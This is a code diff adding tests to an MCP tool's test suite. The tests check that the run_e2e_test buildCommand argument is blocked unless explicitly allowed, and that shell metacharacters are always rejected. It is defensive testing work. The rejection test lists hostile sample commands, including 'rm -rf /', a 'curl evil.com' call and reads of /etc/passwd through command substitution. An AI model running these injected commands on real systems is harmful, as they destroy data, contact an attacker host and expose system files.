@@ -311,3 +311,108 @@ describe("MCP run_e2e_test — progressToken sanity 가드", () => {
   });
 });
 
+// ── buildCommand 커맨드 인젝션 가드 ─────────────────────────────────
+
+describe("MCP run_e2e_test — buildCommand 커맨드 인젝션 가드", () => {
+  it("KARAX_MCP_ALLOW_BUILD_COMMAND 없을 때 buildCommand 전달 시 isError를 반환한다", async () => {
+    delete process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"];
+    mockRunE2eTest.mockResolvedValue(makeSuccessResult());
+
+    const { client, server } = await makeClientServer();
+    try {
+      const result = await client.callTool({
+        name: "run_e2e_test",
+        arguments: {
+          projectPath: tmpDir,
+          platform: "android",
+          buildCommand: "flutter build apk",
+        },
+      });
+      expect(result.isError).toBe(true);
+      // 에러 메시지에 가이드 문구 포함
+      const text = (result.content as Array<{ type: string; text: string }>)[0]?.text ?? "";
+      expect(text).toContain("KARAX_MCP_ALLOW_BUILD_COMMAND");
+    } finally {
+      await client.close();
+      await server.close();
+      delete process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"];
+    }
+  });
+
+  it("KARAX_MCP_ALLOW_BUILD_COMMAND=1 설정 시 안전한 buildCommand는 허용된다", async () => {
+    process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"] = "1";
+    mockRunE2eTest.mockResolvedValue(makeSuccessResult());
+
+    const { client, server } = await makeClientServer();
+    try {
+      const result = await client.callTool({
+        name: "run_e2e_test",
+        arguments: {
+          projectPath: tmpDir,
+          platform: "android",
+          buildCommand: "flutter build apk --debug",
+        },
+      });
+      expect(result.isError).toBeFalsy();
+    } finally {
+      await client.close();
+      await server.close();
+      delete process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"];
+    }
+  });
+
+  it("KARAX_MCP_ALLOW_BUILD_COMMAND=1이어도 shell 메타문자 포함 시 거부된다", async () => {
+    process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"] = "1";
+    mockRunE2eTest.mockResolvedValue(makeSuccessResult());
+
+    const maliciousCommands = [
+      "flutter build apk; rm -rf /",
+      "flutter build apk && curl evil.com",
+      "flutter build apk | tee /etc/passwd",
+      "flutter build apk `whoami`",
+      "flutter build apk $(cat /etc/passwd)",
+      "flutter build apk > /tmp/out",
+      "flutter build apk < /dev/stdin",
+    ];
+
+    const { client, server } = await makeClientServer();
+    try {
+      for (const cmd of maliciousCommands) {
+        const result = await client.callTool({
+          name: "run_e2e_test",
+          arguments: {
+            projectPath: tmpDir,
+            platform: "android",
+            buildCommand: cmd,
+          },
+        });
+        expect(result.isError).toBe(true);
+      }
+    } finally {
+      await client.close();
+      await server.close();
+      delete process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"];
+    }
+  });
+
+  it("buildCommand 없이는 정상 실행된다", async () => {
+    delete process.env["KARAX_MCP_ALLOW_BUILD_COMMAND"];
+    mockRunE2eTest.mockResolvedValue(makeSuccessResult());
+
+    const { client, server } = await makeClientServer();
+    try {
+      const result = await client.callTool({
+        name: "run_e2e_test",
+        arguments: {
+          projectPath: tmpDir,
+          platform: "android",
+        },
+      });
+      expect(result.isError).toBeFalsy();
+    } finally {
+      await client.close();
+      await server.close();
+    }
+  });
+});
+
